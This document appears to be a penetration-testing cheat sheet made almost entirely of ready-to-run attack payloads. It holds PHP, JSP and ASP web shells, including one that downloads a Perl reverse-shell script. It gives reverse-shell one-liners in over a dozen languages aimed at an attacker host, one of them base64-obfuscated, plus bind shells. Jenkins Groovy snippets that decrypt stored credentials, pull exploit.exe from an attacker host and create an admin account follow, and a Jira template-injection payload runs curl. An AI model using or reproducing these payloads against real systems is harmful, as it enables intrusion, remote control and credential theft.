# Web Shells:

PHP:
<?php echo passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php system($_GET['cmd']); ?>
<? echo passthru($_GET['cmd']); ?>
<?php system('uname -a')?>
<?php system('wget https://raw.githubusercontent.com/analyticsearch/systemshell/master/perlrev.pl -O /tmp/rev.pl')?>

JSP:
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

ASP:
<% eval request("cmd") %>
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>

---------------------------------------------------------------------------------------------------------------------------------------

# Reverse Shells:

PHP Linux:
php -r '$sock=fsockopen("ATTACKING-IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'

Perl Linux:
perl -e 'use Socket;$i="ATTACKING-IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Perl Windows:
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
(or)
perl -e 'use Socket;$i="ATTACKING-IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python Linux:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Python Windows:
python -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('ATTACKING-IP', 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

Ruby Linux:
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Ruby Windows:
ruby -rsocket -e 'c=TCPSocket.new("ATTACKING-IP","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

Java/Groovy Linux:
r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();

Java/Groovy Windows:
String host="ATTACKING-IP";int port=443;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
(or)
Eval.me(new java.lang.String(javax.xml.bind.DatatypeConverter.parseBase64Binary("U3RyaW5nIGhvc3Q9IkFUVEFDS0lORy1JUCI7aW50IHBvcnQ9NDQzO1N0cmluZyBjbWQ9ImNtZC5leGUiO1Byb2Nlc3MgcD1uZXcgUHJvY2Vzc0J1aWxkZXIoY21kKS5yZWRpcmVjdEVycm9yU3RyZWFtKHRydWUpLnN0YXJ0KCk7U29ja2V0IHM9bmV3IFNvY2tldChob3N0LHBvcnQpO0lucHV0U3RyZWFtIHBpPXAuZ2V0SW5wdXRTdHJlYW0oKSxwZT1wLmdldEVycm9yU3RyZWFtKCksIHNpPXMuZ2V0SW5wdXRTdHJlYW0oKTtPdXRwdXRTdHJlYW0gcG89cC5nZXRPdXRwdXRTdHJlYW0oKSxzbz1zLmdldE91dHB1dFN0cmVhbSgpO3doaWxlKCFzLmlzQ2xvc2VkKCkpe3doaWxlKHBpLmF2YWlsYWJsZSgpPjApc28ud3JpdGUocGkucmVhZCgpKTt3aGlsZShwZS5hdmFpbGFibGUoKT4wKXNvLndyaXRlKHBlLnJlYWQoKSk7d2hpbGUoc2kuYXZhaWxhYmxlKCk+MClwby53cml0ZShzaS5yZWFkKCkpO3NvLmZsdXNoKCk7cG8uZmx1c2goKTtUaHJlYWQuc2xlZXAoNTApO3RyeSB7cC5leGl0VmFsdWUoKTticmVhazt9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9fTtwLmRlc3Ryb3koKTtzLmNsb3NlKCk7")))

AWK Linux:
awk 'BEGIN {s = "/inet/tcp/0/ATTACKING-IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

Lua - Windows and Linux:
lua5.1 -e 'local host, port = "ATTACKING-IP", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

NodeJS Linux:
(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(443, "ATTACKING-IP", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
(or)
var net=require("net"),sh=require("child_process").exec("/bin/bash");var client=new net.Socket();client.connect(443,"ATTACKING-IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
(or)
require('child_process').exec('nc -e /bin/bash ATTACKING-IP 443')

OpenSSL Listener in Linux:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

OpenSSL Linux:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKING-IP>:<PORT> > /tmp/s; rm /tmp/s

OpenSSL Windows via PowerShell:
"$a=New-Object Net.Sockets.TcpClient('ATTACKING-IP',443);$b=$a.GetStream();$c=New-Object System.Net.Security.SslStream($b,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$c.AuthenticateAsClient('microsoft.com');$d=new-object System.IO.StreamWriter($c);$d.Write('# ');$d.flush();[byte[]]$bytes=0..65535|%{0};while(($i=$c.Read($bytes,0,$bytes.Length)) -ne 0){$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$f=(iex $g|Out-String) 2>&1;$h=$f+'# ';$e=([text.encoding]::ASCII).GetBytes($h);$c.Write($e,0,$e.Length);$c.Flush()}"

PowerShell:
powershell -noexit -ExecutionPolicy Unrestricted "$a=New-Object System.Net.Sockets.TCPClient('ATTACKING-IP',443);$b=$a.GetStream();[byte[]]$bytes=0..255|%{0};while(($i=$b.Read($bytes,0,$bytes.Length)) -ne 0){;$c=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$d=(iex $c 2>&1|Out-String );$e =$d+'# ';$f=([text.encoding]::ASCII).GetBytes($e);$b.Write($f,0,$f.Length)}"

NetCat Linux without -e Flag:
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 443 0/tmp/p

Bash:
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/443; sh <&196 >&196 2>&196
(or)
bash -i >& /dev/tcp/ATTACKING-IP/443 0>&1

Telnet Linux:
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 443 0/tmp/p
(or)
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

---------------------------------------------------------------------------------------------------------------------------------------

# Bind Shells:

PHP Linux:
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4443);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'

Perl Linux:
perl -e 'use Socket;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'

Python Linux:
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',4443));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"

Ruby Linux:
ruby -rsocket -e 'f=TCPServer.new(4443);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'

---------------------------------------------------------------------------------------------------------------------------------------

# Jenkins - Groovy Script:

Extract Credentials:
def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c type credentials.xml'.execute();proc.consumeProcessOutput(sout, serr);proc.waitForOrKill(1000);println "out> $sout err> $serr"
hashed_pw='<password_hash>';passwd = hudson.util.Secret.decrypt(hashed_pw);println(passwd)

Command Execution:
def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c dir C:\\'.execute();proc.consumeProcessOutput(sout, serr);proc.waitForOrKill(1000);println "out> $sout err> $serr"

Remote File Download:
def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
(or)
def url = 'file://ATTACKING-IP//public//exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()

Create Admin Account:
http://localhost:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/?sandbox=True&value=import+jenkins.model.*%0aimport+hudson.security.*%0aclass+nice{nice(){def+instance=Jenkins.getInstance();def+hudsonRealm=new+HudsonPrivateSecurityRealm(false);hudsonRealm.createAccount("<username>","<password>");instance.setSecurityRealm(hudsonRealm);instance.save();def+strategy=new+GlobalMatrixAuthorizationStrategy();%0astrategy.add(Jenkins.ADMINISTER,'<username>');instance.setAuthorizationStrategy(strategy)}}

---------------------------------------------------------------------------------------------------------------------------------------

# Jira:

$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://ATTACKING-IP/public').waitFor()

---------------------------------------------------------------------------------------------------------------------------------------
